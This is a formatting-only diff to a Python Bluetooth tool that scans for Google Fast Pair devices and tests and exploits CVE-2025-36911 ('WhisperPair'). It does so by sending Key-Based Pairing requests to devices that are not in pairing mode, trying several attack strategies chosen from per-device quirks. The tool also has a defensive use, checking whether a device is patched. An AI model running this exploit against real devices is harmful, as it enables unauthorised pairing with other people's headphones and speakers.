@@ -93,11 +93,7 @@ class FastPairScanner:
         logger.info("Fast Pair scanner stopped")
 
     def _parse_fast_pair_advertisement(
-        self,
-        name: str | None,
-        address: str,
-        data: bytes,
-        rssi: int,
+        self, name: str | None, address: str, data: bytes, rssi: int
     ) -> BLEDevice:
         """Parse Fast Pair advertisement data (same logic as Android/WPair)."""
         model_id = None
@@ -142,7 +138,7 @@ class FastPairScanner:
 class WhisperPairTester:
     """
     Tests Fast Pair devices for CVE-2025-36911 (WhisperPair) vulnerability.
-    
+
     Sends Key-Based Pairing request to devices NOT in pairing mode.
     If accepted (GATT_SUCCESS), device is VULNERABLE.
     If rejected (0x0e, 0x05, etc.), device is PATCHED.
@@ -156,7 +152,7 @@ class WhisperPairTester:
         """Test a device for WhisperPair vulnerability."""
         try:
             from bleak import BleakClient
-            from bleak.backends.characteristic import BleakGATTCharacteristic
+            from bleak.backends.characteristic import BleakGATTCharacteristic  # noqa: F401
         except ImportError:
             return {"status": "error", "error": "bleak not installed"}
 
@@ -208,7 +204,12 @@ class WhisperPairTester:
 
         except Exception as e:
             error_str = str(e).lower()
-            if "0x0e" in error_str or "0x05" in error_str or "0x06" in error_str or "0x03" in error_str:
+            if (
+                "0x0e" in error_str
+                or "0x05" in error_str
+                or "0x06" in error_str
+                or "0x03" in error_str
+            ):
                 return {
                     "status": "patched",
                     "address": address,
@@ -258,7 +259,7 @@ class WhisperPairExploit:
     ) -> bytes:
         """
         Build KBP request based on strategy.
-        
+
         KBP Request format (from Android FastPairExploit.kt):
         - Byte 0: Message type (0x00 = Key-Based Pairing Request)
         - Byte 1: Flags
@@ -368,7 +369,12 @@ class WhisperPairExploit:
 
         except Exception as e:
             error_str = str(e).lower()
-            if "0x0e" in error_str or "0x05" in error_str or "0x06" in error_str or "0x03" in error_str:
+            if (
+                "0x0e" in error_str
+                or "0x05" in error_str
+                or "0x06" in error_str
+                or "0x03" in error_str
+            ):
                 return {
                     "status": "patched",
                     "strategy": strategy.value,
@@ -394,15 +400,21 @@ class WhisperPairExploit:
 
         # If device prefers extended response, try that first
         if quirks.get("needsExtendedResponse", False):
-            strategies = [self.Strategy.EXTENDED_RESPONSE] + [s for s in strategies if s != self.Strategy.EXTENDED_RESPONSE]
+            strategies = [self.Strategy.EXTENDED_RESPONSE] + [
+                s for s in strategies if s != self.Strategy.EXTENDED_RESPONSE
+            ]
 
         # If device prefers BR/EDR bonding, try strategies that support seeking
         if quirks.get("prefersBrEdrBonding", False):
-            strategies = [self.Strategy.RAW_WITH_SEEKER] + [s for s in strategies if s != self.Strategy.RAW_WITH_SEEKER]
+            strategies = [self.Strategy.RAW_WITH_SEEKER] + [
+                s for s in strategies if s != self.Strategy.RAW_WITH_SEEKER
+            ]
 
         # If device uses retroactive flag, prioritize that
         if quirks.get("usesRetroactiveFlag", False):
-            strategies = [self.Strategy.RETROACTIVE] + [s for s in strategies if s != self.Strategy.RETROACTIVE]
+            strategies = [self.Strategy.RETROACTIVE] + [
+                s for s in strategies if s != self.Strategy.RETROACTIVE
+            ]
 
         def progress(msg: str):
             if progress_callback:
@@ -480,7 +492,7 @@ def _load_device_quirks() -> dict[str, Any]:
                     "delayBeforeKbp": 0,
                     "usesRetroactiveFlag": False,
                     "maxKbpRetries": 3,
-                    "preferredStrategy": "RAW_KBP"
+                    "preferredStrategy": "RAW_KBP",
                 }
             }
         },
@@ -490,8 +502,8 @@ def _load_device_quirks() -> dict[str, Any]:
             "delayBeforeKbp": 0,
             "usesRetroactiveFlag": False,
             "maxKbpRetries": 3,
-            "preferredStrategy": "RAW_KBP"
-        }
+            "preferredStrategy": "RAW_KBP",
+        },
     }
 
     # Try to load from config file
@@ -507,7 +519,9 @@ def _load_device_quirks() -> dict[str, Any]:
                 with open(path) as f:
                     data = json.load(f)
                     _DEVICE_QUIRKS_CACHE = data
-                    logger.info("Loaded device quirks", path=str(path), devices=len(data.get("devices", {})))
+                    logger.info(
+                        "Loaded device quirks", path=str(path), devices=len(data.get("devices", {}))
+                    )
                     return data
             except Exception as e:
                 logger.warning("Failed to load device quirks", path=str(path), error=str(e))
